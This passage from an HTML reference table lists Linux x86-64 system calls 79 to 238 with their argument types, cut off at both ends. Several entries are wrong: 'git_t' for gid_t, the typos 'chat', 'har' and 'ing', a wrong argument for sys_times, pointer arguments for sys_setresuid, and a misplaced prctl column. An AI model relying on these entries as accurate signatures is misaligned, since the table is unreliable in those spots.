         <td>char *buf</td>
         <td>unsigned long size</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>80</td>
         <td>sys_chdir</td>
         <td>const char *filename</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>81</td>
         <td>sys_fchdir</td>
         <td>unsigned int fd</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>82</td>
         <td>sys_rename</td>
         <td>const char *oldname</td>
         <td>const char *newname</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>83</td>
         <td>sys_mkdir</td>
         <td>const char *pathname</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>84</td>
         <td>sys_rmdir</td>
         <td>const char *pathname</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>85</td>
         <td>sys_creat</td>
         <td>const char *pathname</td>
         <td>int mode</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>86</td>
         <td>sys_link</td>
         <td>const char *oldname</td>
         <td>const char *newname</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>87</td>
         <td>sys_unlink</td>
         <td>const char *pathname</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>88</td>
         <td>sys_symlink</td>
         <td>const char *oldname</td>
         <td>const char *newname</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>89</td>
         <td>sys_readlink</td>
         <td>const char *path</td>
         <td>char *buf</td>
         <td>int bufsiz</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>90</td>
         <td>sys_chmod</td>
         <td>const char *filename</td>
         <td>mode_t mode</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>91</td>
         <td>sys_fchmod</td>
         <td>unsigned int fd</td>
         <td>mode_t mode</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>92</td>
         <td>sys_chown</td>
         <td>const char *filename</td>
         <td>uid_t user</td>
         <td>git_t group</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>93</td>
         <td>sys_fchown</td>
         <td>unsigned int fd</td>
         <td>uid_t user</td>
         <td>git_t group</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>94</td>
         <td>sys_lchown</td>
         <td>const char *filename</td>
         <td>uid_t user</td>
         <td>git_t group</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>95</td>
         <td>sys_umask</td>
         <td>int mask</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>96</td>
         <td>sys_gettimeofday</td>
         <td>struct timeval *tv</td>
         <td>struct timezone *tz</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>97</td>
         <td>sys_getrlimit</td>
         <td>unsigned int resource</td>
         <td>struct rlimit *rlim</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>98</td>
         <td>sys_getrusage</td>
         <td>int who</td>
         <td>struct rusage *ru</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>99</td>
         <td>sys_sysinfo</td>
         <td>struct sysinfo *info</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>100</td>
         <td>sys_times</td>
         <td>struct sysinfo *info</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>101</td>
         <td>sys_ptrace</td>
         <td>long request</td>
         <td>long pid</td>
         <td>unsigned long addr</td>
         <td>unsigned long data</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>102</td>
         <td>sys_getuid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>103</td>
         <td>sys_syslog</td>
         <td>int type</td>
         <td>char *buf</td>
         <td>int len</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>104</td>
         <td>sys_getgid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>105</td>
         <td>sys_setuid</td>
         <td>uid_t uid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>106</td>
         <td>sys_setgid</td>
         <td>git_t gid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>107</td>
         <td>sys_geteuid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>108</td>
         <td>sys_getegid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>109</td>
         <td>sys_setpgid</td>
         <td>pid_t pid</td>
         <td>pid_t pgid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>110</td>
         <td>sys_getppid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>111</td>
         <td>sys_getpgrp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>112</td>
         <td>sys_setsid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>113</td>
         <td>sys_setreuid</td>
         <td>uid_t ruid</td>
         <td>uid_t euid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>114</td>
         <td>sys_setregid</td>
         <td>git_t rgid</td>
         <td>gid_t egid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>115</td>
         <td>sys_getgroups</td>
         <td>int gidsetsize</td>
         <td>gid_t *grouplist</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>116</td>
         <td>sys_setgroups</td>
         <td>int gidsetsize</td>
         <td>gid_t *grouplist</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>117</td>
         <td>sys_setresuid</td>
         <td>uid_t *ruid</td>
         <td>uid_t *euid</td>
         <td>uid_t *suid</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>118</td>
         <td>sys_getresuid</td>
         <td>uid_t *ruid</td>
         <td>uid_t *euid</td>
         <td>uid_t *suid</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>119</td>
         <td>sys_setresgid</td>
         <td>gid_t rgid</td>
         <td>gid_t egid</td>
         <td>gid_t sgid</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>120</td>
         <td>sys_getresgid</td>
         <td>git_t *rgid</td>
         <td>git_t *egid</td>
         <td>git_t *sgid</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>121</td>
         <td>sys_getpgid</td>
         <td>pid_t pid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>122</td>
         <td>sys_setfsuid</td>
         <td>uid_t uid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>123</td>
         <td>sys_setfsgid</td>
         <td>gid_t gid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>124</td>
         <td>sys_getsid</td>
         <td>pid_t pid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>125</td>
         <td>sys_capget</td>
         <td>cap_user_header_t header</td>
         <td>cap_user_data_t dataptr</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>126</td>
         <td>sys_capset</td>
         <td>cap_user_header_t header</td>
         <td>const cap_user_data_t data</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>127</td>
         <td>sys_rt_sigpending</td>
         <td>sigset_t *set</td>
         <td>size_t sigsetsize</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>128</td>
         <td>sys_rt_sigtimedwait</td>
         <td>const sigset_t *uthese</td>
         <td>siginfo_t *uinfo</td>
         <td>const struct timespec *uts</td>
         <td>size_t sigsetsize</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>129</td>
         <td>sys_rt_sigqueueinfo</td>
         <td>pid_t pid</td>
         <td>int sig</td>
         <td>siginfo_t *uinfo</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>130</td>
         <td>sys_rt_sigsuspend</td>
         <td>sigset_t *unewset</td>
         <td>size_t sigsetsize</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>131</td>
         <td>sys_sigaltstack</td>
         <td>const stack_t *uss</td>
         <td>stack_t *uoss</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>132</td>
         <td>sys_utime</td>
         <td>char *filename</td>
         <td>struct utimbuf *times</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>133</td>
         <td>sys_mknod</td>
         <td>const char *filename</td>
         <td>int mode</td>
         <td>unsigned dev</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>134</td>
         <td>sys_uselib</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>135</td>
         <td>sys_personality</td>
         <td>unsigned int personality</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>136</td>
         <td>sys_ustat</td>
         <td>unsigned dev</td>
         <td>struct ustat *ubuf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>137</td>
         <td>sys_statfs</td>
         <td>const char *pathname</td>
         <td>struct statfs *buf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>138</td>
         <td>sys_fstatfs</td>
         <td>unsigned int fd</td>
         <td>struct statfs *buf</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>139</td>
         <td>sys_sysfs</td>
         <td>int option</td>
         <td>unsigned long arg1</td>
         <td>unsigned long arg2</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>140</td>
         <td>sys_getpriority</td>
         <td>int which</td>
         <td>int who</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>141</td>
         <td>sys_setpriority</td>
         <td>int which</td>
         <td>int who</td>
         <td>int niceval</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>142</td>
         <td>sys_sched_setparam</td>
         <td>pid_t pid</td>
         <td>struct sched_param *param</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>143</td>
         <td>sys_sched_getparam</td>
         <td>pid_t pid</td>
         <td>struct sched_param *param</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>144</td>
         <td>sys_sched_setscheduler</td>
         <td>pid_t pid</td>
         <td>int policy</td>
         <td>struct sched_param *param</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>145</td>
         <td>sys_sched_getscheduler</td>
         <td>pid_t pid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>146</td>
         <td>sys_sched_get_priority_max</td>
         <td>int policy</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>147</td>
         <td>sys_sched_get_priority_min</td>
         <td>int policy</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>148</td>
         <td>sys_sched_rr_get_interval</td>
         <td>pid_t pid</td>
         <td>struct timespec *interval</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>149</td>
         <td>sys_mlock</td>
         <td>unsigned long start</td>
         <td>size_t len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>150</td>
         <td>sys_munlock</td>
         <td>unsigned long start</td>
         <td>size_t len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>151</td>
         <td>sys_mlockall</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>152</td>
         <td>sys_munlockall</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>153</td>
         <td>sys_vhangup</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>154</td>
         <td>sys_modify_ldt</td>
         <td>int func</td>
         <td>void *ptr</td>
         <td>unsigned long bytecount</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>155</td>
         <td>sys_pivot_root</td>
         <td>const char *new_root</td>
         <td>const char *put_old</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>156</td>
         <td>sys__sysctl</td>
         <td>struct __sysctl_args *args</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>157</td>
         <td>sys_prctl</td>
         <td>int option</td>
         <td>unsigned long arg2</td>
         <td>unsigned long arg3</td>
         <td>unsigned long arg4</td>
         <td></td>
         <td>unsigned long arg5</td>
      </tr>
      <tr>
         <td>158</td>
         <td>sys_arch_prctl</td>
         <td>struct task_struct *task</td>
         <td>int code</td>
         <td>unsigned long *addr</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>159</td>
         <td>sys_adjtimex</td>
         <td>struct timex *txc_p</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>160</td>
         <td>sys_setrlimit</td>
         <td>unsigned int resource</td>
         <td>struct rlimit *rlim</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>161</td>
         <td>sys_chroot</td>
         <td>const char *filename</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>162</td>
         <td>sys_sync</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>163</td>
         <td>sys_acct</td>
         <td>const char *name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>164</td>
         <td>sys_settimeofday</td>
         <td>struct timeval *tv</td>
         <td>struct timezone *tz</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>165</td>
         <td>sys_mount</td>
         <td>char *dev_name</td>
         <td>char *dir_name</td>
         <td>char *type</td>
         <td>unsigned long flags</td>
         <td>void *data</td>
         <td></td>
      </tr>
      <tr>
         <td>166</td>
         <td>sys_umount2</td>
         <td>const char *target</td>
         <td>int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>167</td>
         <td>sys_swapon</td>
         <td>const char *specialfile</td>
         <td>int swap_flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>168</td>
         <td>sys_swapoff</td>
         <td>const char *specialfile</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>169</td>
         <td>sys_reboot</td>
         <td>int magic1</td>
         <td>int magic2</td>
         <td>unsigned int cmd</td>
         <td>void *arg</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>170</td>
         <td>sys_sethostname</td>
         <td>char *name</td>
         <td>int len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>171</td>
         <td>sys_setdomainname</td>
         <td>char *name</td>
         <td>int len</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>172</td>
         <td>sys_iopl</td>
         <td>unsigned int level</td>
         <td>struct pt_regs *regs</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>173</td>
         <td>sys_ioperm</td>
         <td>unsigned long from</td>
         <td>unsigned long num</td>
         <td>int turn_on</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>174</td>
         <td>sys_create_module</td>
         <td>REMOVED IN Linux 2.6</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>175</td>
         <td>sys_init_module</td>
         <td>void *umod</td>
         <td>unsigned long len</td>
         <td>const char *uargs</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>176</td>
         <td>sys_delete_module</td>
         <td>const chat *name_user</td>
         <td>unsigned int flags</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>177</td>
         <td>sys_get_kernel_syms</td>
         <td>REMOVED IN Linux 2.6</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>178</td>
         <td>sys_query_module</td>
         <td>REMOVED IN Linux 2.6</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>179</td>
         <td>sys_quotactl</td>
         <td>unsigned int cmd</td>
         <td>const char *special</td>
         <td>qid_t id</td>
         <td>void *addr</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>180</td>
         <td>sys_nfsservctl</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>181</td>
         <td>sys_getpmsg</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>182</td>
         <td>sys_putpmsg</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>183</td>
         <td>sys_afs_syscall</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>184</td>
         <td>sys_tuxcall</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>185</td>
         <td>sys_security</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>186</td>
         <td>sys_gettid</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>187</td>
         <td>sys_readahead</td>
         <td>int fd</td>
         <td>loff_t offset</td>
         <td>size_t count</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>188</td>
         <td>sys_setxattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td>const void *value</td>
         <td>size_t size</td>
         <td>int flags</td>
         <td></td>
      </tr>
      <tr>
         <td>189</td>
         <td>sys_lsetxattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td>const void *value</td>
         <td>size_t size</td>
         <td>int flags</td>
         <td></td>
      </tr>
      <tr>
         <td>190</td>
         <td>sys_fsetxattr</td>
         <td>int fd</td>
         <td>const char *name</td>
         <td>const void *value</td>
         <td>size_t size</td>
         <td>int flags</td>
         <td></td>
      </tr>
      <tr>
         <td>191</td>
         <td>sys_getxattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td>void *value</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>192</td>
         <td>sys_lgetxattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td>void *value</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>193</td>
         <td>sys_fgetxattr</td>
         <td>int fd</td>
         <td>const har *name</td>
         <td>void *value</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>194</td>
         <td>sys_listxattr</td>
         <td>const char *pathname</td>
         <td>char *list</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>195</td>
         <td>sys_llistxattr</td>
         <td>const char *pathname</td>
         <td>char *list</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>196</td>
         <td>sys_flistxattr</td>
         <td>int fd</td>
         <td>char *list</td>
         <td>size_t size</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>197</td>
         <td>sys_removexattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>198</td>
         <td>sys_lremovexattr</td>
         <td>const char *pathname</td>
         <td>const char *name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>199</td>
         <td>sys_fremovexattr</td>
         <td>int fd</td>
         <td>const char *name</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>200</td>
         <td>sys_tkill</td>
         <td>pid_t pid</td>
         <td>ing sig</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>201</td>
         <td>sys_time</td>
         <td>time_t *tloc</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>202</td>
         <td>sys_futex</td>
         <td>u32 *uaddr</td>
         <td>int op</td>
         <td>u32 val</td>
         <td>struct timespec *utime</td>
         <td>u32 *uaddr2</td>
         <td>u32 val3</td>
      </tr>
      <tr>
         <td>203</td>
         <td>sys_sched_setaffinity</td>
         <td>pid_t pid</td>
         <td>unsigned int len</td>
         <td>unsigned long *user_mask_ptr</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>204</td>
         <td>sys_sched_getaffinity</td>
         <td>pid_t pid</td>
         <td>unsigned int len</td>
         <td>unsigned long *user_mask_ptr</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>205</td>
         <td>sys_set_thread_area</td>
         <td>NOT IMPLEMENTED. Use arch_prctl</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>206</td>
         <td>sys_io_setup</td>
         <td>unsigned nr_events</td>
         <td>aio_context_t *ctxp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>207</td>
         <td>sys_io_destroy</td>
         <td>aio_context_t ctx</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>208</td>
         <td>sys_io_getevents</td>
         <td>aio_context_t ctx_id</td>
         <td>long min_nr</td>
         <td>long nr</td>
         <td>struct io_event *events</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>209</td>
         <td>sys_io_submit</td>
         <td>aio_context_t ctx_id</td>
         <td>long nr</td>
         <td>struct iocb **iocbpp</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>210</td>
         <td>sys_io_cancel</td>
         <td>aio_context_t ctx_id</td>
         <td>struct iocb *iocb</td>
         <td>struct io_event *result</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>211</td>
         <td>sys_get_thread_area</td>
         <td>NOT IMPLEMENTED. Use arch_prctl</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>212</td>
         <td>sys_lookup_dcookie</td>
         <td>u64 cookie64</td>
         <td>long buf</td>
         <td>long len</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>213</td>
         <td>sys_epoll_create</td>
         <td>int size</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>214</td>
         <td>sys_epoll_ctl_old</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>215</td>
         <td>sys_epoll_wait_old</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>216</td>
         <td>sys_remap_file_pages</td>
         <td>unsigned long start</td>
         <td>unsigned long size</td>
         <td>unsigned long prot</td>
         <td>unsigned long pgoff</td>
         <td>unsigned long flags</td>
         <td></td>
      </tr>
      <tr>
         <td>217</td>
         <td>sys_getdents64</td>
         <td>unsigned int fd</td>
         <td>struct linux_dirent64 *dirent</td>
         <td>unsigned int count</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>218</td>
         <td>sys_set_tid_address</td>
         <td>int *tidptr</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>219</td>
         <td>sys_restart_syscall</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>220</td>
         <td>sys_semtimedop</td>
         <td>int semid</td>
         <td>struct sembuf *tsops</td>
         <td>unsigned nsops</td>
         <td>const struct timespec *timeout</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>221</td>
         <td>sys_fadvise64</td>
         <td>int fd</td>
         <td>loff_t offset</td>
         <td>size_t len</td>
         <td>int advice</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>222</td>
         <td>sys_timer_create</td>
         <td>const clockid_t which_clock</td>
         <td>struct sigevent *timer_event_spec</td>
         <td>timer_t *created_timer_id</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>223</td>
         <td>sys_timer_settime</td>
         <td>timer_t timer_id</td>
         <td>int flags</td>
         <td>const struct itimerspec *new_setting</td>
         <td>struct itimerspec *old_setting</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>224</td>
         <td>sys_timer_gettime</td>
         <td>timer_t timer_id</td>
         <td>struct itimerspec *setting</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>225</td>
         <td>sys_timer_getoverrun</td>
         <td>timer_t timer_id</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>226</td>
         <td>sys_timer_delete</td>
         <td>timer_t timer_id</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>227</td>
         <td>sys_clock_settime</td>
         <td>const clockid_t which_clock</td>
         <td>const struct timespec *tp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>228</td>
         <td>sys_clock_gettime</td>
         <td>const clockid_t which_clock</td>
         <td>struct timespec *tp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>229</td>
         <td>sys_clock_getres</td>
         <td>const clockid_t which_clock</td>
         <td>struct timespec *tp</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>230</td>
         <td>sys_clock_nanosleep</td>
         <td>const clockid_t which_clock</td>
         <td>int flags</td>
         <td>const struct timespec *rqtp</td>
         <td>struct timespec *rmtp</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>231</td>
         <td>sys_exit_group</td>
         <td>int error_code</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>232</td>
         <td>sys_epoll_wait</td>
         <td>int epfd</td>
         <td>struct epoll_event *events</td>
         <td>int maxevents</td>
         <td>int timeout</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>233</td>
         <td>sys_epoll_ctl</td>
         <td>int epfd</td>
         <td>int op</td>
         <td>int fd</td>
         <td>struct epoll_event *event</td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>234</td>
         <td>sys_tgkill</td>
         <td>pid_t tgid</td>
         <td>pid_t pid</td>
         <td>int sig</td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>235</td>
         <td>sys_utimes</td>
         <td>char *filename</td>
         <td>struct timeval *utimes</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>236</td>
         <td>sys_vserver</td>
         <td>NOT IMPLEMENTED</td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
         <td></td>
      </tr>
      <tr>
         <td>237</td>
         <td>sys_mbind</td>
         <td>unsigned long start</td>
         <td>unsigned long len</td>
         <td>unsigned long mode</td>
         <td>unsigned long *nmask</td>
         <td>unsigned long maxnode</td>
         <td>unsigned flags</td>
      </tr>
      <tr>
         <td>238</td>
         <td>sys_set_mempolicy</td>
         <td>int mode</td>
         <td>unsigned long *nmask</td>
